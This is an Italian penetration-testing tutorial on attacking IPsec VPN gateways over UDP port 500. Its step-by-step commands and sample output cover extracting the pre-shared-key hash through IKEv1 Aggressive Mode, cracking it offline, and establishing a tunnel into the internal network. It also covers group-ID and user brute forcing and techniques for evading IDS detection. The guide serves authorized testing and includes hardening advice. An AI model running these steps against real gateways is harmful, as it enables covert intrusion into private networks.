---
title: 'Porta 500 ISAKMP: VPN IPsec, IKEv1 Aggressive Mode e PSK Crack'
slug: porta-500-isakmp
description: 'Porta 500 ISAKMP nel pentest: enumerazione VPN IPsec, fingerprint IKE, Aggressive Mode, estrazione hash PSK, cracking offline e accesso alla rete interna tramite tunnel.'
image: /porta-500-isakmp.webp
draft: true
date: 2026-04-05T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - isakmp
  - ipsec
---

> **Executive Summary** — La porta 500 ISAKMP espone il protocollo di negoziazione chiavi per VPN IPsec. Un gateway con IKEv1 Aggressive Mode attivo trasmette l'hash della Pre-Shared Key, crackabile offline. Questa guida copre fingerprint del gateway, estrazione PSK, cracking e accesso alla rete interna via tunnel.

## TL;DR

Porta 500 ISAKMP è il primo segnale di una VPN IPsec: se risponde, c'è un gateway da testare.

IKEv1 Aggressive Mode espone l'hash della Pre-Shared Key, crackabile offline con `psk-crack` o `hashcat`.

Anche senza crack, l'enumerazione rivela vendor, transform set e group ID, fornendo intelligence utile per attacchi mirati.

Porta 500 ISAKMP è il canale UDP su cui i gateway VPN negoziano le chiavi crittografiche per stabilire tunnel IPsec. Quando trovi la porta 500 aperta durante un pentest, hai identificato un endpoint VPN che protegge l'accesso alla rete interna. L'enumerazione porta 500 rivela il vendor del gateway, le transform set accettate, la versione IKE e — nel caso di Aggressive Mode — l'hash della Pre-Shared Key. La porta 500 vulnerabilità più critica è proprio l'Aggressive Mode su IKEv1: l'hash PSK viaggia in chiaro nella fase 1, pronto per essere crackato. Nella kill chain questa porta è un punto di initial access diretto: una PSK crackata equivale a un tunnel VPN verso la LAN interna.

## 1. Anatomia Tecnica della Porta 500

La porta 500 è registrata IANA come `isakmp` su protocollo UDP. ISAKMP (Internet Security Association and Key Management Protocol) gestisce la negoziazione, creazione e gestione delle Security Association (SA) per IPsec.

Il flusso IKE Phase 1 (Main Mode):

1. **Initiator → Responder**: proposta di transform set (encryption, hash, auth method, DH group)
2. **Responder → Initiator**: transform set selezionata
3. **Scambio Diffie-Hellman**: generazione chiave condivisa
4. **Autenticazione**: verifica identità (PSK o certificato) — cifrata in Main Mode, in chiaro in Aggressive Mode

Le varianti operative sono IKEv1 Main Mode (6 messaggi, identità protetta), IKEv1 Aggressive Mode (3 messaggi, identità e hash PSK esposti), IKEv2 (porta 500 + 4500 per NAT-T, più sicuro). La porta 4500 è usata per NAT Traversal (IPsec over UDP).

```
Misconfig: IKEv1 Aggressive Mode abilitato
Impatto: l'hash della PSK viene trasmesso in chiaro, crackabile offline senza interazione ulteriore col target
Come si verifica: ike-scan -M -A 10.10.10.1
```

```
Misconfig: Pre-Shared Key debole o predicibile
Impatto: PSK crackabile in minuti con dizionario. Una volta ottenuta, l'attacker stabilisce il tunnel VPN
Come si verifica: psk-crack -d /usr/share/wordlists/rockyou.txt handshake.psk
```

```
Misconfig: Transform set con cifratura debole (DES, 3DES, MD5)
Impatto: attacchi di downgrade o brute force sulla cifratura del tunnel
Come si verifica: ike-scan -M --trans=1,1,1,2 10.10.10.1 (testa DES/MD5/PSK/DH1)
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sU -p 500 -sV --reason 10.10.10.1
```

**Output atteso:**

```
PORT    STATE SERVICE  REASON
500/udp open  isakmp   udp-response
| isakmp-info:
|   initiator-spi: a1b2c3d4e5f6a7b8
|   responder-spi: 0000000000000000
|   next-payload: Security Association
|_  version: 1.0
```

**Parametri:**

* `-sU`: scan UDP (ISAKMP è esclusivamente UDP)
* `-p 500`: porta specifica del key exchange
* `-sV`: tenta fingerprint del servizio IKE
* `--reason`: mostra perché lo stato è `open` (conferma risposta UDP)

### Comando 2: ike-scan

```bash
ike-scan -M 10.10.10.1
```

**Output atteso:**

```
10.10.10.1	Main Mode Handshake returned
	HDR=(CKY-R=a1b2c3d4e5f6a7b8)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	VID=4048b7d56ebce885 (Cisco Unity)
	VID=afcad71368a1f1c9 (Dead Peer Detection v1.0)
	VID=09002689dfd6b712 (XAUTH)

Ending ike-scan 1.9.5: 1 hosts scanned. 1 returned handshake; 0 returned notify
```

**Cosa ci dice questo output:** il gateway risponde in Main Mode con transform 3DES/SHA1/DH Group 2/PSK. I Vendor ID rivelano Cisco con Unity Client support e XAUTH abilitato. Questo è un classico Cisco ASA o router IOS con VPN. Il fatto che accetti PSK (Pre-Shared Key) è il dato critico — se Aggressive Mode è attivo, puoi estrarre l'hash.

## 3. Enumerazione Avanzata

### Test Aggressive Mode

```bash
ike-scan -M -A --id=vpngroup 10.10.10.1
```

**Output:**

```
10.10.10.1	Aggressive Mode Handshake returned
	HDR=(CKY-R=c4d5e6f7a8b9c0d1)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	Hash=9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b...
	VID=4048b7d56ebce885 (Cisco Unity)

Ending ike-scan 1.9.5: 1 returned handshake
```

**Lettura dell'output:** Aggressive Mode è attivo e il server ha restituito l'hash della PSK nel campo `Hash`. Quel valore è tutto ciò che serve per il cracking offline. L'`--id=vpngroup` specifica il group name — se non lo conosci, il server potrebbe rifiutare. Prova ID comuni: `vpn`, `ipsec`, `remote`, il nome dell'azienda. Per approfondire il fingerprinting VPN, consulta la [guida all'enumerazione di rete](https://hackita.it/articoli/enumeration).

### Brute force del Group ID

Se Aggressive Mode è attivo ma rifiuta il tuo ID, puoi brute-forzare il nome del gruppo:

```bash
ike-scan -M -A --id=vpn 10.10.10.1
ike-scan -M -A --id=remote 10.10.10.1
ike-scan -M -A --id=CORP-VPN 10.10.10.1
```

**Output (successo):**

```
10.10.10.1	Aggressive Mode Handshake returned
```

**Output (fallimento):**

```
10.10.10.1	Notify message 14 (NO-PROPOSAL-CHOSEN)
```

**Lettura dell'output:** `NO-PROPOSAL-CHOSEN` indica che il group ID non è valido. Quando ottieni un handshake, hai trovato l'ID corretto. Puoi automatizzare con un loop: `for id in $(cat group_ids.txt); do ike-scan -M -A --id=$id 10.10.10.1; done`.

### Transform set enumeration completa

```bash
ike-scan -M --trans=5,2,1,2 --trans=7,2,1,2 --trans=5,2,1,5 10.10.10.1
```

**Output:**

```
10.10.10.1	Main Mode Handshake returned
	SA=(Enc=AES-128 Hash=SHA1 Group=2:modp1024 Auth=PSK)
```

**Lettura dell'output:** il gateway accetta AES-128/SHA1/DH2 oltre a 3DES. Questo ti dice quali cifrature sono configurate e se ci sono opzioni deboli. Usa queste informazioni per valutare la sicurezza complessiva del tunnel. Scopri come integrare questi dati nella tua [pipeline di vulnerability assessment](https://hackita.it/articoli/nmap).

### Fingerprint vendor tramite VID

```bash
ike-scan -M -v 10.10.10.1 2>&1 | grep VID
```

**Output:**

```
VID=4048b7d56ebce885 (Cisco Unity)
VID=09002689dfd6b712 (XAUTH)
VID=12f5f28c457168a9 (IKE Fragmentation)
VID=afcad71368a1f1c9 (Dead Peer Detection v1.0)
```

**Lettura dell'output:** Cisco Unity + XAUTH = Cisco ASA o IOS con AnyConnect/VPN client legacy. IKE Fragmentation indica che il gateway gestisce pacchetti IKE grandi (comune in ambienti con NAT). Ogni VID è un'impronta digitale del vendor.

## 4. Tecniche Offensive

**PSK Cracking da Aggressive Mode**

Contesto: Aggressive Mode attivo, hash PSK catturato. Funziona su qualsiasi gateway IKEv1 con Aggressive Mode + PSK.

```bash
# Salva l'output di ike-scan con hash
ike-scan -M -A --id=vpngroup -P handshake.psk 10.10.10.1
```

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt handshake.psk
```

**Output (successo):**

```
Starting psk-crack [ike-scan 1.9.5]
Running in dictionary mode
key "Vpn@2025!" matches SHA1 hash 9a8b7c6d5e4f...
Ending psk-crack: 1 hash cracked
```

**Output (fallimento):**

```
Ending psk-crack: 0 hashes cracked (wordlist exhausted)
```

**Cosa fai dopo:** con la PSK `Vpn@2025!` puoi configurare un client VPN (strongswan, vpnc) per stabilire il tunnel IPsec verso la rete interna. Se il gateway usa XAUTH, servono anche credenziali utente — spesso le stesse dell'Active Directory. Approfondisci le [tecniche di brute force su credenziali AD](https://hackita.it/articoli/bruteforce).

**Tunnel establishment con PSK crackata**

Contesto: PSK ottenuta, gateway Cisco con XAUTH.

```bash
# Configurazione strongswan (/etc/ipsec.conf)
cat > /etc/ipsec.conf << 'EOF'
conn target-vpn
    keyexchange=ikev1
    ike=3des-sha1-modp1024
    esp=3des-sha1
    type=tunnel
    left=%defaultroute
    right=10.10.10.1
    rightsubnet=192.168.0.0/16
    authby=psk
    aggressive=yes
    rightid=vpngroup
    xauth=client
    xauth_identity=jsmith
    auto=start
EOF
echo '10.10.10.1 : PSK "Vpn@2025!"' >> /etc/ipsec.secrets
echo 'jsmith : XAUTH "Password1"' >> /etc/ipsec.secrets
ipsec restart && ipsec up target-vpn
```

**Output (successo):**

```
initiating Aggressive Mode IKE_SA target-vpn[1] to 10.10.10.1
generating AGGRESSIVE request 1
parsed AGGRESSIVE response 1
XAUTH authentication of 'jsmith' successful
IKE_SA target-vpn[1] established
CHILD_SA target-vpn installed, reqid 1, ESP SPIs: ca1b2c3d_i da4e5f6a_o
```

**Output (fallimento):**

```
generating AGGRESSIVE request 1
parsed INFORMATIONAL response: NO_PROPOSAL_CHOSEN
establishing IKE_SA failed
```

**Cosa fai dopo:** tunnel stabilito. Ora hai accesso alla subnet 192.168.0.0/16. Lancia un discovery con `nmap -sn 192.168.0.0/16` per mappare la rete interna e prosegui con la [kill chain](https://hackita.it/articoli/killchain).

**IKEv2 brute force credenziali EAP**

Contesto: gateway IKEv2 senza Aggressive Mode ma con EAP auth. Più lento, ma ancora testabile.

```bash
# Con ikev2-brute (custom script) o hydra se il gateway supporta EAP-MSCHAPv2
cat users.txt | while read user; do
  ike-scan -2 -M --auth=eap --id="$user" 10.10.10.1 2>&1 | grep -q "Handshake" && echo "[+] Valid user: $user"
done
```

**Output (successo):**

```
[+] Valid user: jsmith
[+] Valid user: svc_vpn
```

**Output (fallimento):**

```
(nessun output - nessun utente valido trovato)
```

**Cosa fai dopo:** hai enumerato utenti validi sul gateway VPN. Combina con un [password spray mirato](https://hackita.it/articoli/passwordspray) sugli utenti trovati.

## 5. Scenari Pratici di Pentest

### Scenario 1: Internet-facing Cisco ASA con Aggressive Mode

**Situazione:** perimetro aziendale con Cisco ASA esposto su IP pubblico. VPN site-to-site e remote access attive. Stai testando dall'esterno.

**Step 1:**

```bash
ike-scan -M -A --id=vpn [target_public_ip]
```

**Output atteso:**

```
Aggressive Mode Handshake returned
SA=(Enc=AES-256 Hash=SHA256 Group=14 Auth=PSK)
```

**Step 2:**

```bash
ike-scan -M -A --id=vpn -P hash.psk [target_public_ip]
psk-crack -d /usr/share/wordlists/rockyou.txt hash.psk
```

**Output atteso:**

```
key "Company2025!" matches SHA256 hash
```

**Se fallisce:**

* Causa probabile: PSK complessa, non in dizionario
* Fix: genera wordlist custom con `cewl` dal sito aziendale + regole hashcat: `hashcat -m 5300 hash.psk wordlist.txt -r rules/best64.rule`

**Tempo stimato:** 5-15 minuti per enum, 10 min–ore per crack (dipende dalla complessità PSK)

### Scenario 2: Lab con IKEv1 Main Mode only

**Situazione:** gateway VPN in lab che accetta solo Main Mode. Aggressive Mode disabilitato. Devi comunque enumerare e testare.

**Step 1:**

```bash
ike-scan -M --trans=7,2,1,2 --trans=7,2,1,5 --trans=5,2,1,2 [target]
```

**Output atteso:**

```
Main Mode Handshake returned
SA=(Enc=AES-256 Hash=SHA1 Group=5:modp1536 Auth=PSK)
```

**Step 2:**

```bash
# Senza Aggressive Mode, il PSK hash non è estraibile direttamente.
# Prova credential spray se XAUTH è attivo:
ike-scan -M --id=admin --auth=xauth [target]
```

**Se fallisce:**

* Causa probabile: Main Mode protegge l'hash PSK, non estraibile passivamente
* Fix: pivota su altri vettori — cerca credenziali VPN in dump di database, phishing, o config backup esposti

**Tempo stimato:** 10-20 minuti per enum, il crack diretto non è possibile senza Aggressive Mode

### Scenario 3: EDR-heavy con NAT-T su porta 4500

**Situazione:** rete corporate con IDS/IPS perimetrale. Il gateway VPN usa NAT-T sulla porta 4500 oltre alla 500. EDR monitora connessioni anomale.

**Step 1:**

```bash
nmap -sU -p 500,4500 -sV [target]
```

**Output atteso:**

```
500/udp  open  isakmp
4500/udp open  ipsec-nat-t
```

**Step 2:**

```bash
ike-scan -M --nat-t [target]:4500
```

**Output atteso:**

```
Main Mode Handshake returned (NAT-T detected)
VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
```

**Se fallisce:**

* Causa probabile: IPS blocca pacchetti IKE malformati o rate-limita i tentativi
* Fix: riduci velocità con `--interval=500` (500ms tra pacchetti) e usa `--sport=500` per sembrare traffico VPN legittimo

**Tempo stimato:** 15-30 minuti, overhead per evasione IDS

## 6. Attack Chain Completa

```
Recon (scan UDP 500) → IKE Fingerprint → Aggressive Mode PSK Extract → PSK Crack → Tunnel Establishment → Internal Recon → Lateral Movement
```

| Fase           | Tool       | Comando chiave                                     | Output/Risultato       |
| -------------- | ---------- | -------------------------------------------------- | ---------------------- |
| Recon          | nmap       | `nmap -sU -p 500,4500 [target]`                    | Gateway VPN attivo     |
| Fingerprint    | ike-scan   | `ike-scan -M -v [target]`                          | Vendor, transform, VID |
| PSK Extract    | ike-scan   | `ike-scan -M -A --id=[group] -P hash.psk [target]` | Hash PSK               |
| Crack          | psk-crack  | `psk-crack -d rockyou.txt hash.psk`                | PSK in chiaro          |
| Tunnel         | strongswan | `ipsec up target-vpn`                              | Tunnel IPsec stabilito |
| Internal Recon | nmap       | `nmap -sn 192.168.0.0/16`                          | Mappa rete interna     |

**Timeline stimata:** 30 minuti – 4 ore (il bottleneck è il cracking della PSK).

**Ruolo della porta 500:** è il gateway verso la rete interna. Una PSK debole trasforma un endpoint esterno in un punto di accesso diretto alla LAN corporate.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Log del gateway VPN**: tentativi IKE Phase 1 falliti, Aggressive Mode da IP sconosciuti. Su Cisco ASA: `show crypto isakmp sa` e syslog level 4-5
* **IDS/IPS**: regole Snort per IKE Aggressive Mode (SID 1:2028-2030), scansioni ike-scan (pattern VID probe)
* **SIEM**: correlazione tra tentativi IKE multipli dallo stesso IP e tentativi XAUTH falliti

### Tecniche di Evasion

```
Tecnica: Source port 500
Come: usa --sport=500 in ike-scan per apparire come traffico VPN legittimo peer-to-peer
Riduzione rumore: IDS che filtrano per source port non-500 non rilevano il probe
```

```
Tecnica: Singolo tentativo per IP sorgente
Come: un solo pacchetto Aggressive Mode, poi cambi IP (se hai più exit point)
Riduzione rumore: evita trigger su regole "IKE brute force" che cercano tentativi multipli
```

```
Tecnica: Timing lento
Come: --interval=2000 (2 secondi tra pacchetti) per restare sotto i rate limit
Riduzione rumore: il traffico si confonde con tentativi VPN legittimi di client con problemi di connessione
```

### Cleanup Post-Exploitation

* Disconnetti il tunnel IPsec: `ipsec down target-vpn`
* Rimuovi configurazione locale: cancella `/etc/ipsec.conf` e `/etc/ipsec.secrets` custom
* Se hai fatto brute force: il gateway logga ogni tentativo — non è possibile rimuovere quei log dall'esterno

## 8. Toolchain e Confronto

### Pipeline operativa

```
nmap (scan 500/4500) → ike-scan (fingerprint + Aggressive Mode) → psk-crack/hashcat (cracking) → strongswan/vpnc (tunnel) → nmap (internal recon)
```

Dati che passano: IP gateway, vendor VID, transform set, group ID, PSK hash, PSK in chiaro, subnet interna.

### Tabella comparativa

| Aspetto               | IPsec/IKE (500/UDP)                      | OpenVPN (1194/UDP)      | WireGuard (51820/UDP)  |
| --------------------- | ---------------------------------------- | ----------------------- | ---------------------- |
| Porta default         | 500 (+4500 NAT-T)                        | 1194                    | 51820                  |
| Key exchange          | IKE Phase 1/2                            | TLS handshake           | Noise Protocol         |
| Vulnerabilità nota    | Aggressive Mode PSK leak                 | Dipende da config TLS   | Nessuna nota           |
| Crack possibile       | Sì (PSK da Aggressive)                   | No (TLS)                | No (Curve25519)        |
| Diffusione enterprise | Altissima (Cisco, Fortinet)              | Media                   | Bassa (in crescita)    |
| Quando preferirlo     | Gateway Cisco/Fortinet/Palo Alto esposti | Server VPN Linux/custom | Infrastrutture moderne |

## 9. Troubleshooting

| Errore / Sintomo                              | Causa                                                               | Fix                                                                                          |
| --------------------------------------------- | ------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| Nmap mostra `open\|filtered` su 500/udp       | Nessuna risposta UDP (firewall o servizio inattivo)                 | Usa `ike-scan -M [target]` — più affidabile di nmap per IKE                                  |
| `NO-PROPOSAL-CHOSEN` su Aggressive Mode       | Group ID sbagliato o Aggressive Mode disabilitato                   | Prova ID diversi: nome azienda, `vpn`, `ipsec`. Se tutti falliscono, Aggressive non è attivo |
| `psk-crack` non trova la key                  | PSK non in dizionario                                               | Passa a hashcat con regole: `hashcat -m 5300 hash.psk wordlist.txt -r best64.rule`           |
| Tunnel si stabilisce ma nessun traffico passa | Split tunneling o routing mancante                                  | Aggiungi rotta manuale: `ip route add 192.168.0.0/16 dev ipsec0`                             |
| `ike-scan` non riceve risposta                | Porta 500 filtrata da ACL o il gateway accetta solo da IP specifici | Prova dalla subnet del cliente se il pentest è interno                                       |

## 10. FAQ

**D: Come verificare se una VPN IPsec sulla porta 500 usa Aggressive Mode?**

R: Usa `ike-scan -M -A --id=test [target]`. Se il gateway risponde con un handshake, Aggressive Mode è attivo. Se risponde con `NO-PROPOSAL-CHOSEN` o non risponde, è disabilitato o il group ID è sbagliato.

**D: Porta 500 ISAKMP è TCP o UDP?**

R: La porta 500 usa esclusivamente UDP. IKE è un protocollo request-response su UDP. La porta 4500 (sempre UDP) è usata per NAT Traversal quando uno dei peer è dietro NAT.

**D: Quanto tempo serve per crackare una PSK IPsec?**

R: Dipende dalla complessità. Una PSK basata su parole di dizionario cade in secondi-minuti con `psk-crack`. PSK complesse (12+ caratteri random) possono richiedere giorni o essere impraticabili. Hashcat con GPU accelera significativamente (mode 5300 per IKEv1, 25100 per IKEv2).

**D: IKEv2 è vulnerabile come IKEv1 Aggressive Mode?**

R: No. IKEv2 non ha Aggressive Mode e non espone l'hash PSK durante la negoziazione. Gli attacchi su IKEv2 sono limitati a brute force online delle credenziali EAP, molto più lento e rilevabile.

**D: Quali tool servono per un pentest VPN IPsec sulla porta 500?**

R: Kit base: `ike-scan` (fingerprint e PSK extraction), `psk-crack` (cracking integrato), `hashcat` (cracking GPU), `strongswan` o `vpnc` (tunnel establishment). Su Kali: `apt install ike-scan strongswan`.

## 11. Cheat Sheet Finale

| Azione               | Comando                                                | Note                          |
| -------------------- | ------------------------------------------------------ | ----------------------------- |
| Scan UDP 500         | `nmap -sU -p 500,4500 -sV [target]`                    | Includi 4500 per NAT-T        |
| IKE fingerprint      | `ike-scan -M -v [target]`                              | Rivela vendor VID e transform |
| Test Aggressive Mode | `ike-scan -M -A --id=[group] [target]`                 | Prova ID comuni se rifiuta    |
| Salva PSK hash       | `ike-scan -M -A --id=[group] -P hash.psk [target]`     | File per psk-crack/hashcat    |
| Crack PSK            | `psk-crack -d rockyou.txt hash.psk`                    | Dizionario base               |
| Crack PSK GPU        | `hashcat -m 5300 hash.psk wordlist.txt -r best64.rule` | Molto più veloce              |
| Transform enum       | `ike-scan -M --trans=5,2,1,2 [target]`                 | Testa AES/SHA1/DH2            |
| Stabilire tunnel     | `ipsec up target-vpn`                                  | Richiede config strongswan    |
| NAT-T probe          | `ike-scan -M --nat-t [target]:4500`                    | Verifica NAT Traversal        |

### Perché Porta 500 è rilevante nel 2026

Le VPN IPsec restano lo standard per connessioni site-to-site in ambienti enterprise (Cisco, Fortinet, Palo Alto). La migrazione a IKEv2 è in corso ma IKEv1 con Aggressive Mode è ancora presente su gateway legacy. Verifica con `ike-scan -M -A` su ogni IP perimetrale — anche gateway aggiornati possono avere Aggressive Mode abilitato per backward compatibility con client vecchi.

### Hardening e Mitigazione

* Disabilita IKEv1 Aggressive Mode: su Cisco ASA `crypto isakmp aggressive-mode disable`
* Usa IKEv2 con autenticazione certificato: `crypto ikev2 profile` con `authentication remote rsa-sig`
* Imposta PSK complesse (20+ caratteri random) se PSK è obbligatorio
* Abilita DH Group 14+ (2048-bit) minimo: `crypto isakmp policy 10 group 14`

### OPSEC per il Red Team

`ike-scan` genera traffico UDP caratteristico sulla porta 500: i Vendor ID probe sono firmati. Un singolo tentativo Aggressive Mode è relativamente silenzioso. Il brute force del group ID genera multipli tentativi che i gateway loggano come `Phase 1 failure`. Per ridurre visibilità: limita a 1-2 tentativi per minuto, usa `--sport=500` e se possibile opera da un IP che potrebbe plausibilmente essere un peer VPN legittimo.

***

Tutti i comandi e le tecniche sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto, lab, CTF. Riferimento: RFC 2409 (IKEv1), RFC 7296 (IKEv2), RFC 3948 (NAT-T).

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).\
>

Leggi anche il manuale officiale di cisco: [http://cisco.com/c/it\_it/support/docs/security-vpn/ipsec-negotiation-ike-protocols/217432-understand-ipsec-ikev1-protocol.html](http://cisco.com/c/it_it/support/docs/security-vpn/ipsec-negotiation-ike-protocols/217432-understand-ipsec-ikev1-protocol.html)
